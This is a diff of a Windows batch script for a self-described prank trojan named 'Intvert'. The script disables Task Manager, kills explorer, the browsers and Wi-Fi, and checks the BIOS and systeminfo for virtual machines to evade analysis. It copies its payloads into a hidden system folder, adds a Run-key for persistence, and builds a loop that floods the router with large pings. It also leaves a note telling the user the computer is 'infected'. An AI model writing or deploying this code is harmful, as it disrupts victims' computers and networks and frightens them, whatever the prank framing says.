@@ -43,7 +43,7 @@ Rundll32 user32,SwapMouseButton
 :: Swap the mouse buttons
 start s7.vbs
 start Main.vbs
-start %userprofile%\Documents\Yes.txt
+start /max %userprofile%\Documents\Yes.txt
 :: Open a txt document trying to scare the user
 timeout /t 22 /nobreak
 :: Fun fact: Without error the website payload used to, and should be timed with the drop of the song
@@ -115,16 +115,17 @@ Powershell.exe -executionpolicy get-process | stop-process -force
 :killeverythinga
 TASKKILL /F /IM wscript.exe
 REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
-::for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
+::for /f "usebackq tokens=2 delims=," %a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" | FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
 :: If you are using a uncompiled version uncoment the above and comment out the bellow
 ::-------From-Here-------
 TASKKILL /F /IM cmd.exe
+::--------To-Here--------
 TASKKILL /F /IM explorer.exe
 TASKKILL /F /IM firefox.exe
 TASKKILL /F /IM chrome.exe
 TASKKILL /F /IM MicrosoftEdge.exe
 TASKKILL /F /IM Magnify.exe
-::--------To-Here--------
+
 goto killeda
 
 :killeverythingb
@@ -133,18 +134,17 @@ netsh interface set interface "Wi-Fi" admin=disable
 TASKKILL /F /IM wscript.exe
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 0 /F
 REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
-::for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
-:: If you are using a uncompiled version uncoment the above and comment out the bellow
+::for /f "usebackq tokens=2 delims=," %a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" | FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe):: If you are using a uncompiled version uncoment the above and comment out the bellow
 ::-------From-Here-------
 TASKKILL /F /IM cmd.exe
+::--------To-Here--------
 TASKKILL /F /IM explorer.exe
 TASKKILL /F /IM firefox.exe
 TASKKILL /F /IM chrome.exe
 TASKKILL /F /IM MicrosoftEdge.exe
 TASKKILL /F /IM Magnify.exe
-::--------To-Here--------
 goto killedb
-::--------------------------------=Main-Script--------------------------------
+::--------------------------------Main-Script--------------------------------
 :skipmainscript
 title Intvert
 NET SESSION >nul 2>&1
@@ -152,11 +152,7 @@ IF %ERRORLEVEL% EQU 0 (
     GOTO ADMIN
 ) ELSE (
     GOTO NONADMIN
-)
-:NONADMIN
-echo.
-:: Non-admin has no functionality at the moment	
-echo This script will run without admin but will be extremely limited, most payloads will not run as they require editing regkeys or elevated privliges	
+)	
 :ADMIN
 :: These scripts had to be moved above to make slower systems not be able to stop the program mid-setup
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
@@ -166,17 +162,6 @@ REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V Hi
 :: Hide desktop icons, then restart explorer (makes the above script more reliable)
 taskkill /f /im explorer.exe
 start explorer.exe
-cd %userprofile%\downloads
-( echo @echo off
-  echo :: Creating a dir for all the "payloads" to be stored in
-  echo RMDIR /Q /S c:\windows\sIntvert
-  echo cd c:\windows
-  echo md sIntvert
-  echo attrib +h sIntvert) > cd.bat
-( echo Set WshShell = CreateObject("WScript.Shell"^) 
-  echo WshShell.Run chr(34^) ^& "%%userprofile%%\downloads\cd.bat" ^& Chr(34^), 0
-  echo Set WshShell = Nothing) >cd.vbs
-start cd.vbs
 RMDIR /Q /S c:\windows\sIntvert
 cd c:\windows
 md sIntvert
@@ -184,11 +169,11 @@ attrib +h sIntvert
 cd c:\windows\sIntvert
 ::--------------------Is-This-A-VM-----------------------------
 :: Might be disabed in release as it can false trigger
-wmic bios get serialnumber | find /I /V "SerialNumber" > "%temp%\sn.txt"
-set /p serial=<"%temp%\sn.txt"
+wmic bios get serialnumber | find /I /V "SerialNumber" > "%userprofile%\sn.txt"
+set /p serial=<"%userprofile%\sn.txt"
 echo %serial%
-wmic bios get version | find /I /V "Version" > "%temp%\v.txt"
-set /p compver=<"%temp%\v.txt"
+wmic bios get version | find /I /V "Version" > "%userprofile%\v.txt"
+set /p compver=<"%userprofile%\v.txt"
 echo %compver%	
 IF "%compver%"=="" goto FAKEPC
 IF "%compver%"=="0" goto FAKEPC
@@ -198,14 +183,13 @@ IF "%serial%"=="" goto FAKEPC
 IF "%serial%"=="0" goto FAKEPC
 IF "%serial%"==" " goto FAKEPC
 IF "%serial%"=="None" goto FAKEPC
-systeminfo > %temp%\sysinfo.txt
-findstr /e "System Manufacturer:       VMware, Inc." temp.txt
+systeminfo > %userprofile%\sysinfo.txt
+findstr /e "System Manufacturer:       VMware, Inc." %userprofile%\sysinfo.txt
 if errorlevel 1 (
-    findstr /e "System Model:              Virtual Machine" temp.txt
+    findstr /e "System Model:              Virtual Machine" %userprofile%\sysinfo.txt
 	if errorlevel 1 (
-		findstr /e "System Model:              VMware Virtual Platform" temp.txt
+		findstr /e "System Model:              VMware Virtual Platform" %userprofile%\sysinfo.txt
 		if errorlevel 1 (
-			echo Must be real
 			goto REALPC
 		) else (
 			goto FAKEPC
@@ -218,10 +202,10 @@ if errorlevel 1 (
 )
 :REALPC
 echo Real Hardware
-del %temp%\v.txt
-del %temp%\sysinfo.txt
-del %temp%\sn.txt
-del temp.txt
+del %userprofile%\v.txt
+del %userprofile%\sysinfo.txt
+del %userprofile%\sn.txt
+del %userprofile%\temp.txt
 goto afterwads
 :FAKEPC
 ( echo Ok real quick,
@@ -232,35 +216,32 @@ goto afterwads
   echo.
   echo This exe isn't distructive and if you are super nervous you can
   echo download a "uncompiled" version from B0N3head github and see what
-  echo makes me tick.) >%temp%\VM1.txt
-start %temp%\VM1.txt
+  echo makes me tick.) >%userprofile%\VM1.txt
+start %userprofile%\VM1.txt
 set /a VMware=1
 :afterwads
 ::-------------------------------------------------------------
-FOR %%i IN (%~dp0%Cheeta.mp3) DO IF EXIST %%~si\NUL goto compiled
-xcopy "%~dp0%Cheeta.mp3" "c:\windows\system32\sIntvert" /s /h.
-xcopy "%~dp0%Christmas.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%~dp0%Main.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%~dp0%MakeItDemBurn.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%~dp0%StartUp.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%~dp0%TitleScreen.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%~dp0%main.bat" "c:\windows\system32\sIntvert" /s /h
-xcopy "%~dp0%pic.jpg" "c:\windows\system32\sIntvert" /s /h
-xcopy "%~dp0%bkg1.jpg" "c:\windows\system32\sIntvert" /s /h
-xcopy "%~dp0%Intvert.exe" "c:\windows\system32\sIntvert" /s /h
+xcopy "%~dp0%Cheeta.mp3" "c:\windows\sIntvert" /s /h.
+xcopy "%~dp0%Christmas.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%~dp0%Main.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%~dp0%MakeItDemBurn.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%~dp0%StartUp.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%~dp0%TitleScreen.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%~dp0%main.bat" "c:\windows\sIntvert" /s /h
+xcopy "%~dp0%pic.jpg" "c:\windows\sIntvert" /s /h
+xcopy "%~dp0%bkg1.jpg" "c:\windows\sIntvert" /s /h
+xcopy "%~dp0%Intvert.exe" "c:\windows\sIntvert" /s /h
 xcopy "%~dp0%Restore.exe" "%userprofile%\desktop" /s /h
-:compiled
-xcopy "%userprofile%\downloads\Cheeta.mp3" "c:\windows\system32\"sIntvert /s /h.
-xcopy "%userprofile%\downloads\Christmas.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\Main.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\MakeItDemBurn.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\StartUp.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\TitleScreen.mp3" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\main.bat" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\pic.jpg" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\bkg1.jpg" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\Intvert.exe" "c:\windows\system32\sIntvert" /s /h
-xcopy "%userprofile%\downloads\Restore.exe" "%userprofile%\desktop" /s /h
+xcopy "%userprofile%\downloads\Cheeta.mp3" "c:\windows\"sIntvert /s /h.
+xcopy "%userprofile%\downloads\Christmas.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%userprofile%\downloads\Main.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%userprofile%\downloads\MakeItDemBurn.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%userprofile%\downloads\StartUp.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%userprofile%\downloads\TitleScreen.mp3" "c:\windows\sIntvert" /s /h
+xcopy "%userprofile%\downloads\main.bat" "c:\windows\sIntvert" /s /h
+xcopy "%userprofile%\downloads\pic.jpg" "c:\windows\sIntvert" /s /h
+xcopy "%userprofile%\downloads\bk1.jpg" "c:\windows\sIntvert" /s /h
+xcopy "%userprofile%\downloads\Intvert.exe" "c:\windows\sIntvert" /s /h	
 :: Clean up crew, isle downloads folder(ONLY FOR EXE)
 del "%userprofile%\downloads\Cheeta.mp3"
 del "%userprofile%\downloads\Christmas.mp3"
@@ -268,10 +249,7 @@ del "%userprofile%\downloads\Main.mp3"
 del "%userprofile%\downloads\MakeItDemBurn.mp3"
 del "%userprofile%\downloads\StartUp.mp3"
 del "%userprofile%\downloads\TitleScreen.mp3"
-del "%userprofile%\downloads\silent.vbs"
 del "%userprofile%\downloads\Intvert.exe"
-del "%userprofile%\downloads\Restore.exe"
-del "%userprofile%\downloads\main.bat"
 del "%userprofile%\downloads\pic.jpg"
 :: Restore posiblely edited regedit keys example
 :: By defult magnifier's magnification is set to 200, so if we opened it it would be obvious, setting it to 100 and making 
@@ -281,15 +259,16 @@ REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d
 REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SystemProc /t REG_SZ /d "c:\windows\sIntvert\.vbs" /f
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 2 /f
 cd c:\windows\sIntvert
+pause
 :: CD to the invert folder made earlier in the script
 :: Main Scripts Now
 ::--------------------BAT---------------------------
 ( echo @echo off
-  echo for /f "tokens=2,3 delims={,}" %%a in ('"WMIC NICConfig where IPEnabled="True" get DefaultIPGateway /value | find "I" "') do echo %%~a > ip
-  echo set /p router= < ip 
+  echo for /f "tokens=2^,3 delims={,}" %%%%a in ('"WMIC NICConfig where IPEnabled="True" get DefaultIPGateway /value | find "I" "^'^) do echo %%%%~a ^> ip
+  echo set /p router= ^< ip 
   echo del ip
   echo :p
-  echo ping %router% -t -l 65500
+  echo ping %%router%% -t -l 65500
   echo goto p) > p.bat
 ( echo @echo off
   echo :sd
@@ -478,10 +457,10 @@ cd c:\windows\sIntvert
   echo :a
   echo start Magnify.exe
   echo reg add HKCU\Software\Microsoft\ScreenMagnifier /v Invert /d 0 /f /t REG_DWORD
-  echo ping 192.0.2.1 -n 1 -w 1666 >nul
+  echo ping 192.0.2.1 -n 1 -w 1666 ^>nul
   echo start Magnify.exe
   echo reg add HKCU\Software\Microsoft\ScreenMagnifier /v Invert /d 1 /f /t REG_DWORD
-  echo ping 192.0.2.1 -n 1 -w 1666 >nul
+  echo ping 192.0.2.1 -n 1 -w 1666 ^>nul
   echo goto a) >vape.bat  
 ( echo @echo off
   echo cd C:\WINDOWS\system32
@@ -618,7 +597,7 @@ cd c:\windows\sIntvert
   echo wscript.sleep 100
   echo loop
   echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >BunDem.vbs
-( echo x=msgbox("Your laptop is mostly happily happy !",48,"Yes"^)) >M1.vbs
+( echo x=msgbox("Your laptop is mostly happily happy!",48,"Yes"^)) >M1.vbs
 ( echo x=msgbox("Still using this computer?",48,"No Shit"^)) >M2.vbs
 ( echo x=msgbox("Lemon mixed with milk",48,"Vinesause?"^)) >M3.vbs
 ( echo x=msgbox("HIT ME AGAIN GODDAMMIT",48,"Ghost"^)) >M0.vbs
@@ -664,7 +643,7 @@ cd %userprofile%
 cd c:\windows\sIntvert
 ( echo Set wshShell =wscript.CreateObject^("WScript.Shell"^)
   echo do
-  echo wscript.sleep 100
+  echo wscript.sleep 1000
   echo wshshell.sendkeys "{H}"
   echo wscript.sleep 10
   echo wshshell.sendkeys "{I}"
@@ -706,15 +685,31 @@ cd %userprofile%\Documents
   echo Shutting down won't stop anything and actialy has a chance
   echo of harming your system, so don't.
   echo Enjoy :D) >Yes.txt
-( echo Your computer hasn't been trashed any tojan
+( echo Your computer hasn't been trashed by any tojan
   echo.
-  echo This program isn't harmfull, its just made to scare/prank you.
-  echo The program changes some regestry keys, to revert this a 
-  echo .exe has been made on the desktop to reset the regkeys and
+  echo This program isn't harmfull, its just made to scare or prank you.
+  echo This program changes some regestry keys, to revert this a 
+  echo .bat has been made on the desktop to reset the regkeys and
   echo everything else that was changed in the process. 
-  echo Don't delete the .exe until use otherwise there will be no way to 
+  echo Don't delete the .bat until use, otherwise there will be no way to 
   echo revert changed reg keys, unless done manually.
   echo.
   echo But since your still here we might aswell give you a show) >GiveItASec.txt
 cd c:\windows\sIntvert
 goto indone
+
+:NONADMIN
+:: This script will run without admin but will be extremely limited, most payloads will not run as they require editing regkeys or elevated privliges
+( echo Your computer has now been infected by the Intvert tojan.
+  echo Have fun trying to use your computer, it won't last long.
+  echo.
+  echo Shutting down won't stop anything and actialy has a chance
+  echo of harming your system, so don't.
+  echo Enjoy :D) >Yes.txt
+( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
+  echo Sound.URL = "Main.mp3"
+  echo Sound.Controls.play
+  echo do while Sound.currentmedia.duration = 0
+  echo wscript.sleep 100
+  echo loop
+  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Main.vbs
